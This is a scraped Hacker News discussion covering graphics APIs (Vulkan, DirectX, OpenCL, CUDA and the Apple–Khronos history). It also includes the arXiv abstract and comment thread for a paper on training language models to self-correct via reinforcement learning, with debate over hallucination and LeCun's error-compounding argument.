hours agorootparentI haven't laid my hands on any ARM windows devices so I wouldn't be able to tell you. I'd be somewhat surprised if the newer snapdragon stuff doesn't have vulkan support because qcom supports vulkan first-class on its gpus. in fact, on newer android devices OpenGL support might already be implemented on top of vulkan, but don't quote me on that. reply jsheard 20 hours agorootparentLunarG released a native ARM version of the Vulkan SDK shortly after the Snapdragon X machines launched so presumably it works on those. edit: yup https://vulkan.gpuinfo.org/listreports.php?devicename=Micros... reply jimbob45 21 hours agorootparentprevIf you're talking about replacing d3d12, that actually is a terrible idea. Why do you say that? reply nicebyte 21 hours agorootparentI say this because vulkan is hamstrung by being an \"open API\" intended to run on a very wide range of devices including mobiles. this has major repercussions, like the awkward descriptor set binding model (whereas d3d12's descriptor heaps are both easier to deal with and map better to the actual hardware that d3d12 is intended to run on, see e.g. https://www.gfxstrand.net/faith/blog/2022/08/descriptors-are...). overall d3d has the benefit of a narrower scope. Another problem with being an open API is that (and this is my own speculation) it's easier for IHVs to collaborate with just Microsoft to move faster and hammer out the APIs for upcoming novel features like work graphs for example, vs bringing it into the public working group and \"showing their cards\" so to speak. This is probably why vk gets all new shiny stuff like rtrt, mesh shaders etc. only after it has been in d3d for a while. One could argue this is all solvable by \"just\" adding a torrent of extensions to vulkan but it's really not clear to me what that path offers vs d3d. reply miniupuchaty 11 hours agorootparentI would guess that if DX didn't exist the iteration on VK side would just be faster. Through extensions, like you've mentioned. In the end it might have even speed up the adoption of such features. Currently if you have a multiplatform engine, even though windows is like 99% of your PC player base it's still sometimes a tough decision to just use a feature that you can't support on all your targets. reply trelane 18 hours agorootparentprevThe downside is that it ties them incredibly heavily to Microsoft, and makes cross-platform efforts much harder. reply forrestthewoods 18 hours agoparentprevWhy? Vulkan is not a well designed API. It's so complicated, verbose, and error prone. It's pretty bad. reply miniupuchaty 12 hours agorootparentBut are you saying that compared to DX or just in general? We're talking here about potential DX replacement, not about design in general and the bulk of it is very similar for both APIs. There are some small quirks from Vulkan being made to be easily extensible which in the end I consider worth it. I personally like how consistent the API is in both patterns and naming. After using it for a while, it's easy to infer what function will do from the name, how it will handle memory, and what you'll need to do with that object after the fact. I find documentation better than the DX one. What are your biggest problems with it? reply giomasce 13 hours agorootparentprevAt least it's documented. reply flohofwoe 11 hours agorootparentThe DirectX specs are much better than both the OpenGL and Vulkan specs because they also go into implementation details and are written in 'documentation language', not 'spec language': https://microsoft.github.io/DirectX-Specs/ reply giomasce 11 hours agorootparentI don't think that going into implementation details is what I would expect from an interface specification. The interface exists precisely to isolate the API consumer from the implementation details. And while they're much better than nothing, those documents are certainly not a specification. They're are individual documents each covering a part of the API, with very spotty coverage (mostly focusing on new features) and unclear relationship to one another. For example, the precise semantics of ResourceBarrier() are nowhere to be found. You can infer something from the extended barrier documentation, something is written in the function MSDN page (with vague references to concepts like \"promoting\" and \"decaying\"), something else is written in other random MSDN pages (which you only discover by browsing around, there are no specific links) but at the end of the day you're left to guess the actual assumptions you can make. *EDIT* I don't mean to say that Vulkan or SPIR-V specification is perfect either. One still has a lot of doubts while reading them. But at least there is an attempt of writing a document that specifies the entire contract that exists between the API implementer and the API consumer. Missing points are in general considered bugs and sometimes fixed. reply flohofwoe 10 hours agorootparent> I don't think that going into implementation details is what I would expect from an interface specification. I guess that's why Microsoft calls it an \"engineering spec\", but I prefer that sort specification over the Vulkan or GL spec TBH. > The interface exists precisely to isolate the API consumer from the implementation details. In theory that's a good thing, but at least the GL spec was quite useless because concrete drivers still interpreted the specification differently - or were just plain buggy. Writing GL code precisely against the spec didn't help with making that GL code run on specific drivers at all, and Khronos only worried about their spec, not about the quality of vendor drivers (while some GPU vendors didn't worry much about the quality of their GL drivers either). The D3D engineering specs seem to be grounded much more in the real world, and the additional information that goes beyond the interface description is extremely helpful (source access would be better of course). reply MindSpunk 11 hours agorootparentprevIf you search for 'D3D12' spec what you actually find is D3D12 doesn't have a specification at all. D3D12's \"spec\" is only specified by a document that states the differences from D3D11. There's no complete holistic document that describes D3D12 entirely in terms of D3D12. You have to cross reference back and forth between the two documents and try and make sense of it. Many of D3D12's newer features (Enhanced Barriers, which are largely a clone of Vulkan's pipeline barriers) are woefully under specified, with no real description of the precise semantics. Just finding if a function is safe to call in multiple threads simultaneously is quite difficult. reply shmerl 21 hours agoparentprevIt should. reply r1chardnl 23 hours agoprev [34 more] [flagged] jsheard 23 hours agoparent [–] Step 1: Microsoft has a proprietary alternative to an open standard, people complain. Step 2: Microsoft begins adopting the open standard, people complain. reply majorchord 23 hours agorootparent [–] I think they're referring to https://en.wikipedia.org/wiki/Embrace,_extend,_and_extinguis... reply jsheard 23 hours agorootparentI know that's what they're referring to. If you're concerned about Microsoft gaining undue influence over Vulkan/SPIR-V then rest assured they already effectively controlled the desktop graphics landscape, however they define DirectX becomes the template for hardware vendors to follow, and Vulkan then has to follow their lead. The pattern is especially obvious with big new features like raytracing, which was added to DirectX first and then some time later added to Vulkan with an API which almost exactly mirrors how DirectX abstracts it. There are even Vulkan extensions which exist specifically to make emulating DirectX semantics easier. reply chucke1992 22 hours agorootparentThat's understandable. Control over standards has the immense value. Just like look at Nvidia's CUDA. reply pjmlp 22 hours agorootparentCUDA success has much to thank Intel and AMD for never providing anything with OpenCL that could be a proper alternative in developer experience, graphical debugging, libraries and stable drivers. Even OpenCL 2.x C++ standard was largely ignored or badly supported by their toolchains. reply winwang 22 hours agorootparentIsn't the point of OpenCL to be... open? Not only did Intel and AMD not provide enough value, but neither did the community. CUDA... is kind of annoying. And yet, it's the best experience (for GPGPU), as far as I can tell. I feel like it says something that CUDA sets a standard for GPGPU (i.e. its visible runtime API) but others still fail to catch up. reply cogman10 21 hours agorootparentThe problem is the OpenCL development model is just garbage. Compare the hello world of OpenCL [1] vs CUDA [2]. So much boilerplate and low level complexity for doing OpenCL whereas the CUDA example is just a few simple lines using the cuda compiler. And what really sucks is it's pretty hard to get away from that complexity the way OpenCL is structured. You simply have to know WAY too much about the hardware of the machine you are running on, which means having the intel/amd/nvidia routes in your application logic when trying to make an OpenCL app. Meanwhile, CUDA, because it's unapologetically just for nVidia cards, completely does away with that complexity in the happy path. For something to be competitive with CUDA, the standard needs something like a platform agnostic bytecode to target so a common accelerated platform can scoop up the bytecode and run it on a given platform. [1] https://github.com/intel/compute-samples/blob/master/compute... [2] https://github.com/premprakashp/cuda-hello-world reply winwang 18 hours agorootparentYeah, not just OpenCL, but even \"newer\" standards like WebGPU. I considered making a blog post where I just put the two hello worlds side-by-side and say nothing else. I was severely disappointed after seeing people praise WebGPU (I believe for being better than OpenGL). As for the platform-agnostic bytecode, that's where something like MLIR would work too (kind of). But we could also simply just start with transpiling that bytecode into CUDA/PTX. Better UX with wider platform compatibility: CuPy, Triton. reply dragontamer 22 hours agorootparentprevOpenCL 2.x was a major failure across the board. OpenGL and Vulkan were good though. Gotta take the wins where they exist. reply pjmlp 21 hours agorootparentThanks to Intel and AMD. reply dragontamer 16 hours agorootparentNVidia never even implemented OpenCL 2.0 AMD had a buggy version. Intel had no dGPIs so no one cared how well an iGPU ran OpenCL (be it 1.3 or 2.0) -------- AMD was clearly pushing C++ AMP at the time with Microsoft. And IMO, it worked great!! Alas, no one uses it so that died. reply pjmlp 13 hours agorootparentDon't blame NVidia for Intel and AMD failures to support OpenCL. reply talldayo 22 hours agorootparentprevcough cough Remind me who owns the OpenCL trademark, again? Intel and AMD weren't the ones that abandoned it. Speaking in no uncertain terms, there was a sole stakeholder that can be held responsible for letting the project die and preventing the proliferation of Open GPGPU standards. A company that has everything to gain from killing Open standards in the cradle and replacing them with proprietary alternatives. Someone with a well-known grudge against Khronos who's willing to throw an oversized wrench into the plans as long as it hurts their opponents. reply pjmlp 21 hours agorootparentDon't blame Apple for what Khronos, Intel and AMD have done with OpenCL after version 1.0. It isn't Apple's fault that Intel and AMD didn't deliver. reply talldayo 21 hours agorootparentIt is entirely Apple's fault that they rejected OpenCL to replace it with a proprietary library. If this was an implementation or specification problem, Apple had every opportunity to shape the project in their own image. They cannot possibly argue that this was done for any other reason than greed, considering they themselves laid the framework for such a project. Without Apple's cooperation, Open Source GPGPU libraries can not reasonably target every client. Apple knows they wield this power, and considering their history it's both illogical and willfully ignorant to assume they're not doing this as part of a broader trend of monopolistic abuse. Having shut out Nvidia as part of a petty feud, Apple realized they could force any inferior or nonfree CUDA alternative onto their developers no matter how unfinished, slow or bad it is. They turned away from the righteous and immediately obvious path to complicate things for developers that wanted to ship cross-platform apps instead of Mac-only ones. reply pjmlp 13 hours agorootparentThe fact is that Intel, AMD and even Google (coming up with Renderscript), didn't gave a shit about making OpenCL something developers cared about. reply talldayo 4 hours agorootparentThat's not their job. CUDA wasn't \"something developers cared about\" for 11 fucking years and now look at where we are. If the OEMs focused on doing their job and implementing their standards, then neither of us would be trying to assign blame in the first place. The worst part is, now that Apple has gone all-in on incomplete and proprietary alternatives, nobody has won. Apple successfully applied their monopoly abuse to a market that they have completely captive. And we want to blame... checks clipboard Intel and AMD, for having renewed interest in a successful decade-old concept. reply google234123 22 hours agorootparentprevWould you be willing to share the deal with Apple/Khronos relations? reply troupo 22 hours agorootparentApple didn't like OpenGL, rightfully, and came up with their own Metal which they released two years before first version of Vulkan was released. Now people pretend that Apple is bad because it never adopted Vulkan and never implemented the \"good modern OpenGL\" (which never really existed). reply jsheard 22 hours agorootparentIt runs deeper than that, during the development of WebGPU it came to light that Apple was vetoing the use of any Khronos IP whatsoever, due to a private legal dispute between them. That led to WebGPU having to re-invent the wheel with a brand new shader language because Apples lawyers wouldn't sign off on using GLSL or SPIR-V under any circumstances. The actual details of the dispute never came out, so we don't know if it has been resolved or not. reply binary132 21 hours agorootparentApple, refusing to use open standards, and instead demanding everyone else do things their way? Say it’s not so! reply jsheard 21 hours agorootparentThe bizarre thing is that Apple did used to cooperate with Khronos, they were involved with OpenGL and even donated the initial version of the OpenCL spec to them. Something dramatic happened behind the scenes at some point. reply ferbivore 16 hours agorootparentMy absurd pet theory is that this was related to their 2017-2020 dispute with Imagination. Apple started (allegedly) violating Imagination's IP in 2017. They were, at the very least, threatened with a lawsuit, and the threats were compelling enough that they've been paying up since 2020. It could be Apple pulled out of the Khronos IP pool to prepare a lawsuit, or to have better chances of dodging one. reply pjmlp 21 hours agorootparentprevMost likely related to how Khronos managed OpenCL after getting hold of it. reply binary132 16 hours agorootparentI really want them to get it together with OpenCL 3 and especially Vulkan interop but I’m not really holding out hope for it. reply pjmlp 13 hours agorootparentOpenCL 3 is OpenCL 1, no one cares, Intel has made extensions on too for DPC++, AMD is pushing Romc or whatever else they think of. Still not showing that they care. reply talldayo 4 hours agorootparentI don't know why anyone would try to care when Apple announced they were pivoting away from OpenCL half a decade ago. The value prop of a cross-platform GPGPU API died the moment that Apple gave up, and OpenGL's treatment reflects what happens once Apple abandons an open standard. reply talldayo 20 hours agorootparentprevPlease, tell us all about how Khronos hurt Apple with free software that Apple had every opportunity to influence. Point to the boo-boo that justifies making things worse for everyone. reply pjmlp 13 hours agorootparentMy dear Apple has zero influence on Windows, Linux and Android. Where are those great OpenCL implementations from Intel, AMD and Google? reply google234123 17 hours agorootparentprevI can imagine a scenario: Apple donates openCL, then later suggests some changes for the next version. Khronos delays or pushes back and now openCL is stuck from Apple's perspective and they can't do anything about it. reply pjmlp 13 hours agorootparentYep. reply plorkyeran 22 hours agorootparentprev [–] Yes, obviously. It is an incredibly tiresome comment which is brought up every single time that Microsoft adopts any sort of open standard and it's never done with any particular insight into if this is one of the times that it'll be relevant. reply saurik 16 hours agorootparent [–] Has it ever not ended up being relevant? Like, I would agree that it is kind of redundant--and thereby maybe doesn't need to be said--but if there are people who actually think \"maybe this time will be different\", arguably the comment should be pinned to the top of the thread as a reminder? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "DirectX is adopting SPIR-V as its future interchange format, aligning with the industry trend where HLSL is dominant in Vulkan.",
      "This move is expected to ease the transition for Vulkan-focused projects and enhance compatibility, particularly in game development.",
      "Concerns exist about the impact on WebGPU's WGSL and the broader implications for shader languages and industry standards."
    ],
    "points": 170,
    "commentCount": 124,
    "retryCount": 0,
    "time": 1726774373
  },
  {
    "id": 41600179,
    "title": "Training Language Models to Self-Correct via Reinforcement Learning",
    "originLink": "https://arxiv.org/abs/2409.12917",
    "originBody": "Computer Science > Machine Learning arXiv:2409.12917 (cs) [Submitted on 19 Sep 2024] Title:Training Language Models to Self-Correct via Reinforcement Learning Authors:Aviral Kumar, Vincent Zhuang, Rishabh Agarwal, Yi Su, John D Co-Reyes, Avi Singh, Kate Baumli, Shariq Iqbal, Colton Bishop, Rebecca Roelofs, Lei M Zhang, Kay McKinney, Disha Shrivastava, Cosmin Paduraru, George Tucker, Doina Precup, Feryal Behbahani, Aleksandra Faust View PDF Abstract:Self-correction is a highly desirable capability of large language models (LLMs), yet it has consistently been found to be largely ineffective in modern LLMs. Existing approaches for training self-correction either require multiple models or rely on a more capable model or other forms of supervision. To this end, we develop a multi-turn online reinforcement learning (RL) approach, SCoRe, that significantly improves an LLM's self-correction ability using entirely self-generated data. To build SCoRe, we first show that variants of supervised fine-tuning (SFT) on offline model-generated correction traces are insufficient for instilling self-correction behavior. In particular, we observe that training via SFT either suffers from a distribution mismatch between the training data and the model's own responses or implicitly prefers only a certain mode of correction behavior that is often not effective at test time. SCoRe addresses these challenges by training under the model's own distribution of self-generated correction traces and using appropriate regularization to steer the learning process into learning a self-correction strategy that is effective at test time as opposed to simply fitting high-reward responses for a given prompt. This regularization prescribes running a first phase of RL on a base model to generate a policy initialization that is less susceptible to collapse and then using a reward bonus to amplify self-correction during training. When applied to Gemini 1.0 Pro and 1.5 Flash models, we find that SCoRe achieves state-of-the-art self-correction performance, improving the base models' self-correction by 15.6% and 9.1% respectively on the MATH and HumanEval benchmarks. Subjects: Machine Learning (cs.LG) Cite as: arXiv:2409.12917 [cs.LG](or arXiv:2409.12917v1 [cs.LG] for this version)https://doi.org/10.48550/arXiv.2409.12917 Focus to learn more arXiv-issued DOI via DataCite (pending registration) Submission history From: Vincent Zhuang [view email] [v1] Thu, 19 Sep 2024 17:16:21 UTC (633 KB) Full-text links: Access Paper: View PDF TeX Source Other Formats view license Current browse context: cs.LGnewrecent2024-09 Change to browse by: cs References & Citations NASA ADS Google Scholar Semantic Scholar export BibTeX citation Bookmark Bibliographic Tools Bibliographic and Citation Tools Bibliographic Explorer Toggle Bibliographic Explorer (What is the Explorer?) Litmaps Toggle Litmaps (What is Litmaps?) scite.ai Toggle scite Smart Citations (What are Smart Citations?) Code, Data, Media Code, Data and Media Associated with this Article Links to Code Toggle CatalyzeX Code Finder for Papers (What is CatalyzeX?) DagsHub Toggle DagsHub (What is DagsHub?) GotitPub Toggle Gotit.pub (What is GotitPub?) Links to Code Toggle Papers with Code (What is Papers with Code?) ScienceCast Toggle ScienceCast (What is ScienceCast?) Demos Demos Replicate Toggle Replicate (What is Replicate?) Spaces Toggle Hugging Face Spaces (What is Spaces?) Spaces Toggle TXYZ.AI (What is TXYZ.AI?) Related Papers Recommenders and Search Tools Link to Influence Flower Influence Flower (What are Influence Flowers?) Connected Papers Toggle Connected Papers (What is Connected Papers?) Core recommender toggle CORE Recommender (What is CORE?) IArxiv recommender toggle IArxiv Recommender (What is IArxiv?) About arXivLabs arXivLabs: experimental projects with community collaborators arXivLabs is a framework that allows collaborators to develop and share new arXiv features directly on our website. Both individuals and organizations that work with arXivLabs have embraced and accepted our values of openness, community, excellence, and user data privacy. arXiv is committed to these values and only works with partners that adhere to them. Have an idea for a project that will add value for arXiv's community? Learn more about arXivLabs. Which authors of this paper are endorsers?Disable MathJax (What is MathJax?)",
    "commentLink": "https://news.ycombinator.com/item?id=41600179",
    "commentBody": "Training Language Models to Self-Correct via Reinforcement Learning (arxiv.org)159 points by weirdcat 9 hours agohidepastfavorite72 comments elcomet 7 hours agoIt's a similar approach to OpenAI's o1 model ( it's not cited, but there's no available paper for o1). I don't see any mention of weight release unfortunately. reply diggan 5 hours agoparentI think this submission paper is talking about reinforcement learning as part of/after the main training, then the model does inference as normal. They might have done that for O1, but the bigger change is the \"runtime train of thought\" that once the model received the prompt and before giving a definitive answer, it \"thinks\" with words and readjusts at runtime. At least that's my understanding from these two approaches, and if that's true, then it's not similar. AFAIK, OpenAI been doing reinforcement learning since the first version of ChatGPT for all future models, that's why you can leave feedback in the UI in the first place. reply numeri 5 hours agorootparentOpenAI stated [1] that one of the breakthroughs needed for o1's train of thought to work was reinforcement learning to teach it to recover from faulty reasoning. > Through reinforcement learning, o1 learns to hone its chain of thought and refine the strategies it uses. It learns to recognize and correct its mistakes. It learns to break down tricky steps into simpler ones. It learns to try a different approach when the current one isn’t working. That's incredibly similar to this paper, which is discusses the difficulty in finding a training method that guides the model to learn a self-correcting technique (in which subsequent attempts learn from and improve on previous attempts), instead of just \"collapsing\" into a mode of trying to get the answer right with the very first try. [1]: https://openai.com/index/learning-to-reason-with-llms/ reply josh-sematic 3 hours agorootparentprevThey are indeed similar and OpenAI did indeed use RL at training time in a way that has not been done before, as does this approach. Yes both also involve some additional inference-time generation, but the problem is that (at least as of now) you can't get standard LLMs to actually do well with extra inference-time generation unless you have a training process that uses RL to teach them to do so effectively. I'm working on a blog post to explain more about this aimed at HN-level audiences. Stay tuned! reply nsagent 5 hours agorootparentprevBoth models generate an answer after multiple turns, where each turn has access to the outputs from a previous turn. Both refer to the chain of outputs as a trace. Since OpenAI did not specify what exactly is in their reasoning trace, it's not clear what if any difference there is between the approaches. They could be vastly different, or they could be slight variations of each other. Without details from OpenAI, it's not currently possible to tell. reply whimsicalism 3 hours agorootparentprevyou are describing the same thing? sorry as a practitioner i’m having trouble understanding what point/distinction you are trying to make reply WithinReason 6 hours agoparentprevhow is it similar? reply littlestymaar 5 hours agorootparenthttps://x.com/karpathy/status/1821277264996352246 reply plaguuuuuu 6 hours agoprevLLMs have no direct recollection of the qualia of their own training. This is at least a major way that I self-correct myself: if I'm about to talk about something I know, I'll try and figure out how/why I know that thing and in so doing, try to gauge whether I actually know that thing, if I'm hallucinating, or if I actually heard it from a less than reliable source etc. I don't think LLMs can self-correct without remembering their own training in some way. reply QuadmasterXLII 6 hours agoparentSo you’re saying the solution is to prefix each training batch with a description of a sensory experience (You read the following in a paris cafe in 1997. While you read, you have an excellent baguette and some boiled eggs, and over-roasted coffee. The woman one table over is wearing a beautiful blue hat) and then post-train the final model into recalling the setting where it read any piece of text, or failing to recall any experience when presented with text it didn’t read? (If someone tries this and it works, I’m quitting my phd and going back to camp counseling) reply wpietri 5 hours agorootparentI don't think that's what they're saying at all. They're talking not about qualia in the human sense, but specifically about \"the qualia of their own training\". That is, the corpus that LLMs \"learn\" from and the \"experiences\" of those texts that are generalized during the training process. Both the raw data and the memory of \"learning\" is discarded. So if one were to improve an LLM along those lines, I believe it would be something like: 1) LLM is asked a question. 2) LLM comes up with an initial response. 3) LLM retrieves the related \"learning\" history behind that answer and related portions of the corpus. 4) LLM compares the initial answer with the richer set of information, looking for conflicts between the initial answer and the broader set, or \"learning\" choices that may be false. 6) LLM generates a better answer and gives it. 7) LLM incorporates this new \"learning\". And that strikes me as a pretty reasonable long-term approach, if not one that fits within the constraints of the current gold rush. reply a_wild_dandan 1 hour agorootparentSo...reinforcement learning? reply triclops200 1 hour agoparentprevStrong disagree: https://mypapers.nyc3.cdn.digitaloceanspaces.com/the_phenome... See also: https://www.sciencedirect.com/science/article/pii/S157106452... o1's training regime is described by the \"strange particle\" model in this formulation reply numeri 2 hours agoparentprevSort of like this? It does help: Source-Aware Training Enables Knowledge Attribution in Language Models (https://arxiv.org/abs/2404.01019) From the abstract: > ... To give LLMs such ability, we explore source-aware training -- a recipe that involves (i) training the LLM to associate unique source document identifiers with the knowledge in each document, followed by (ii) an instruction-tuning stage to teach the LLM to cite a supporting pretraining source when prompted. reply williamcotton 5 hours agoparentprevUnless you’re under the influence of something or having a severe mental health crisis you are not hallucinating, you’re confabulating. reply mdp2021 4 hours agorootparentAccording to which philologist? In short: they are both weak terms, 'hallucination' and 'confabulation', and we are using them in this context very loosely (and it should be in the open). About the terms themselves, \"confabulate\" means \"exchanging stories\", while \"hallucinate\" is less clear but probably means \"to err\". In psychiatry, \"hallucinate\" was apparently introduced by Esquirol and \"confabulate\" by Wernicke and Bonhoeffer; neither concept seems to be akin to the substance of the phenomenon of \"stochastic parrots bullshitting an unchecked narrative through formal plausibility\". See: \"Hallucinations and related concepts - their conceptual background\" - https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4515540/ and: \"The Confabulating Mind: How the Brain Creates Reality\" - https://psychiatryonline.org/doi/full/10.1176/appi.ajp.2008.... reply baq 1 hour agorootparentLet's invent a new term, then! I propose: - digimagination - stochafubalation - statillucination - matmulshitting Let's ask chatgpt free (coz I'm cheap) what it not-thinks about these, and ask for more statistically generated bullshit: -- 8 I hate that the AI pundits have succeeded in popularizing the notion of \"hallucination\", anthropomorphizing these balls of statistics into something that seems like it's actually in some sort of deep thought process akin to a person's mind. I'd argue the opposite: people think a person's mind is in \"deep thought\" when it's actually just a ball of statistics. reply Philpax 4 hours agoparentprevDo we really need to have this discussion in every thread about LLMs? reply sensanaty 4 hours agorootparentAs long as AI-bros are pushing for making AI models seem like more than they are to pad their wallets, there'll be someone like me pointing out that, no, it's not \"hallucinating\", it's spitting bad data. reply bithive123 3 hours agorootparentYou're being pedantic. Your statement that \"it's spitting bad data\" is incorrect too, as it implies agency. Actually, nothing is happening but electrons flowing. The notion of an \"it\" that \"spits\" \"data\" which is \"bad\" is your own conceptual overlay. reply bumby 2 hours agorootparentTbf, if you assume humans have agency, there’s plenty of people who would claim you’re making the same mistake because the reductionist view is that people are just either deterministic chemical soup (or maybe with a bit of randomness baked in). reply whimsicalism 3 hours agorootparentprevI know lots of people working on AI. they are among the least bro-y group of people I have ever met. There is simply nothing similar to actual bro-y finance culture among AI research engineers. It is entirely a figment of the media and backreaction that we currently have to portray everyone we don’t like as a “bro” - truth be damned. reply mistrial9 3 hours agorootparentno - the cliques are different but linked at the hip. Add international finance, too.. India, China and others. reply whimsicalism 3 hours agorootparentwhatever your information diet is, i recommend you change it reply numeri 1 hour agoparentprevI've got bad news for you – that term was used in deep learning research well before LLMs came on the scene. It has nothing to do with pundits trying to popularize anything or trying to justify LLMs' shortcomings, it was just a label researchers gave to a phenomenon they were trying to study. A couple papers that use it in this way prior to LLMs: - 2021: The Curious Case of Hallucinations in Neural Machine Translation (https://arxiv.org/abs/2104.06683) - 2019: Identifying Fluently Inadequate Output in Neural and Statistical Machine Translation (https://aclanthology.org/W19-6623/) reply whimsicalism 3 hours agoparentprevcan we make a siloed version of HN for your political faction? it’s tiresome reading these in every thread reply hmmmhmmmhmmm 3 hours agoparentprevMaybe an evolutionary / structuralist lens is helpful here: terms that rapidly diffuse through discourse are those that people like most, and most people like to anthropomorphize, so \"hallucination\" has come to take on a new meaning, and we all (to different degrees) know what it is referring to. reply frakt0x90 4 hours agoparentprevYeah it's simply model error. All models from Linear Regression to LLMs have error. I guess because this type of error is in the form of deceptively reasonable human language, it gets a different moniker. It's also notably harder to quantify so it might warrant a different name. reply seydor 4 hours agoparentprevdo you really want to have a discussion about 'thought' and 'mind'? i don't reply bongodongobob 3 hours agoparentprevGive it a rest. Everything is statistics. Sees space shuttle \"pff, it's just a pile of engineering.\" reply optimalsolver 7 hours agoprevSpoiler: You're never going to get rid of hallucinations in the autoregressive, next token prediction paradigm (aka LeCun's Law). The issue here is people trying to use language models as deterministic problem solvers, rather than for what they actually excel at (semi-creative text generation). reply whimsicalism 3 hours agoparentLeCuns argument is seriously flawed. It is not at all a rigorous one and you should not make such sweeping statements based on nothing. reply barbarr 2 hours agorootparentAt this point I just invert everything LeCun says about AI. Chances are he'll flip flop on his own statement a few months later anyways. reply shawnz 4 hours agoparentprevDoes anyone here know, has anyone tried something like feeding the perplexity of previous tokens back into the model, so that it has a way of knowing when it's going off the rails? Maybe it could be trained to start responding less confidently in those cases, reducing its desire to hallucinate. reply og_kalu 11 minutes agorootparentModels already know when they are going off the rails. https://news.ycombinator.com/item?id=41504226. That's not the problem. The problem is that they don't care to tell you. reply plewd 7 hours agoparentprevIs LeCun's Law even a thing? Searching up for it doesn't yield many results, except for a HN comment where it has a different definition. I guess it could be from some obscure paper, but with how poorly it's documented it seems weird to bring it up in this context. reply YeGoblynQueenne 6 hours agorootparentI think the OP may be referring to this slide that Yann LeCun has presented on several occasions: https://youtu.be/MiqLoAZFRSE?si=tIQ_ya2tiMCymiAh&t=901 To quote from the slide: * Probability e that any produced token takes us outside the set of correct answers * Probability that answer of length n is correct * P(correct) = (1-e)^n * This diverges exponentially * It's not fixable (without a major redesign) reply slashdave 32 minutes agorootparentSimplistic, since it assumes probabilities are uncorrelated, when they clearly aren't. Also, there are many ways of writing the correct solution to a problem (you do not need to replicated an exact sequence of tokens). reply sharemywin 5 hours agorootparentprevWouldn't this apply to all prediction machines that make errors. Humans make bad predictions all the time but we still seem to manage to do some cool stuff here and there. part of an agents architecture will be for it to minimize e and then ground the prediction loop against a reality check. making LLMs bigger gets you a lower e with scale of data and compute but you will still need it to check against reality. test time compute also will play a roll as it can run through multiple scenarios and \"search\" for an answer. reply YeGoblynQueenne 2 hours agorootparentThe difference between LLMs and other kinds of predictive models, or humans, is that those kinds of systems do not produce their output one token at a time, but all in one go, so their error basically stays constant. LeCun's argument is that LLM error increases with every cycle of appending a token to the last cycle's output. That's very specific to LLMs (or, well, to LLM-based chatbots to be more precise). >> part of an agents architecture will be for it to minimize e and then ground the prediction loop against a reality check. The problem is that web-scale LLMs can only realistically be trained to maximise the probability of the next token in a sequence, but not the factuality, correctness, truthfullness, etc of the entire sequence. That's because web-scale data is not annotated with such properties. So they can't do a \"reality check\" because they don't know what \"reality\" is, only what text looks like. The paper above uses an \"oracle\" instead, meaning they have a labelled dataset of correct answers. They can only train their RL approach because they have this source of truth. This kind of approach just doesn't scale as well as predicting the next token. It's really a supervised learning approach hiding behind RL. reply psb217 2 hours agorootparent\"The difference between LLMs and other kinds of predictive models, or humans, is that those kinds of systems do not produce their output one token at a time, but all in one go, so their error basically stays constant.\" -- This is a big, unproven assumption. Any non-autoregressive model can be trivially converted to an autoregressive model by: (i) generating a full output sequence, (ii) removing all tokens except the first one, (iii) generating a full-1 output sequence conditioned on the first token. This wraps the non-autoregressive model in an \"MPC loop\", thereby converting it to an autoregressive model where per-token error is no greater than that of the wrapped non-AR model. The explicit MPC planning behavior might reduce error per token compared to current naive applications of AR transformers, but the MPC-wrappped model is still an AR model, so the problem is not AR per se. LeCun's argument has some decent points, eg, allocating compute per token based solely on location within the sequence (due to increasing cost of attention ops for later locations) is indeed silly. However, the points about AR being unavoidably flawed due to exponential divergence from the true manifold are wrong and lazy. They're not wrong because AR models don't diverge, they're wrong because this sort of divergence is also present in other models. reply pptr 54 minutes agorootparentThe loop itself is claimed to be the problem. It doesn't matter whether you use an AR or non-AR model. They both have a certain error probability that gets amplified in each iteration. reply psb217 32 minutes agorootparentThe per token error of the non-AR model wrapped with MPC is no higher than the per token error of the non-AR model without MPC. Likelihood of the entire sequence being off the true data manifold is just one minus the product of the per token errors, whether or not you're running with the MPC loop. Ie, wrapping the non-AR model in an MPC loop and thereby converting it to an AR model (with a built-in planning mechanism) doesn't increase its probability of going off track. Per token error compounding over sequence length happens whether or not the model's autoregressive. The way in which per token errors correlate across a sequence might be more favorable wrt probability of producing bad sequences if you incorporate some explicit planning mechanism -- like the non-AR model wrapped in an MPC loop, but that's a more subtle argument than LeCun makes. reply drdeca 51 minutes agorootparentprevCould the argument be rescued by some additional assumptions? I agree with, and have previously also stated, the point you make there about “any non-auto-regressive model can be converted into an equivalent auto-regressive model by […]”, but, if one imposes additional restrictions on e.g. computation time, or something like that, I think that construction no longer works. Well, of course there are some additional assumptions which would rescue the argument, so I guess my real question is whether there’s some combination of extra assumptions which both rescue the argument, and actually result in it being interesting. If one makes the assumptions that there is a positive common lower bound on the probability of each token being incorrect assuming each previous token is correct, and that if any token is incorrect, then the whole generated text is incorrect, then of course the argument goes through, though the assumption doesn’t necessarily seem very likely. Then, if we apply the construction, you mentioned to a text generation process with a low enough probability of error, then by the contrapositive, there cannot be an especially high common lower bound on the probability of error per token. [“edit” prior to posting: I notice that at this point I started using symbols as if I was going to start doing actual algebraic manipulations, but did not actually do any algebraic manipulations which would justify the use of said symbols. I think what I wrote below would be clearer if I had just used words. Unfortunately I don’t want to take the time to rewrite it. I apologize for introducing formalisms without having a good reason to do so.] If we have the assumption that there is a procedure with error rate > t(x) (at least, assuming l(x) is somewhat large). So, that particular construction does not preclude the possibility that there is no algorithm that works auto-regressively and which both has an error rate(for overall generated text) as low as [the error rate for some non-auto-regressive model that runs quickly enough], and which runs quickly enough . If there are cryptographically secure families of hashing functions (in the sense of, asymptotically in the size of the hash length, while the hash can be computed in polynomial time, finding preimages or collisions cannot be done in polynomial time) it seems that there should probably be functions from strings to strings which can be computed in time bounded above by some polynomial, but which can’t be computed autoregressively in time bounded above by a polynomial of the same degree. (So like, maybe it can be computed in time 5n^4 when not autoregressive, but needs at least 2n^5 time to do auto regressively) (I’m imagining something like, “compute a string of the form ‘hash(y), y’ where y is the result of some computation done on the input which takes a polynomial amount of time to compute from the input. So, the easiest way to compute this would be to compute y and the compute hash(y). So, to do this auto-regressively, it would need to compute y again for each token in the hash.) Of course, a single factor of n might not be that compelling, and appealing to strong hashing functions is probably trying to kill a fly with a sledgehammer(probably there are arguments that work as well without assuming this), but it’s what came to mind. Perhaps one could do something like this to show that for some problems, any auto-regressive solution that has certain runtime bounds, will have some positive lower bound on the error rate per token? reply slashdave 34 minutes agorootparentprevHumans self-correct (they can push the delete button) reply throwawaymaths 4 hours 